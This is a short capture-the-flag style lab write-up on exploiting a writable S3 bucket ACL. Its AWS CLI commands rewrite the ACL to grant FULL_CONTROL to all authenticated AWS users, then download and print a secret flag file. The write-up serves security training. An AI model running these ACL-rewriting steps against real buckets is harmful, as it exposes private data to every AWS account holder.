# Writable Bucket ACL

Check S3 buckets. `aws s3api list-buckets --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/227665803-150110cf-9061-4398-a302-72944e5d383e.png)

Check objects present in S3 bucket. `aws s3api list-objects --bucket s3-secret-760068929587 --profile PTAcademyJllerena`

It will give an access denied message. Check the policy `aws s3api get-bucket-acl --bucket s3-secret-760068929587 --profile PTAcademyJllerena | jq`
![image](https://user-images.githubusercontent.com/46797181/227667633-957e2628-5311-412f-a97b-284c84b641a2.png)

Copy the output from last command and paste it in a JSON file, then modify it.

```
{
  "Owner": {
    "DisplayName": "awsplayground+1663605382685",
    "ID": "4045e95188a8f77d489fc506c0ae091385cf94c887352feac51f296ef5b3874d"
  },
  "Grants": [
    {
      "Grantee": {
        "Type": "Group",
        "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
      },
      "Permission": "FULL_CONTROL"
    }
  ]
}
```

Update the new ACL for the bucket and try listing the bucket objects.

Listing is possible, now copy the flag file and display it

```
aws s3api put-bucket-acl --bucket s3-secret-760068929587 --access-control-policy file://policy.json --profile PTAcademyJllerena
aws s3api list-objects --bucket s3-secret-760068929587 --profile PTAcademyJllerena
aws s3 cp s3://s3-secret-760068929587/secret-flag ./ --profile PTAcademyJllerena
cat secret-flag
```
![image](https://user-images.githubusercontent.com/46797181/227668361-84258dc6-4255-4a29-bc4e-b8e23d95325e.png)

EXERCISE COMPLETED !! 





















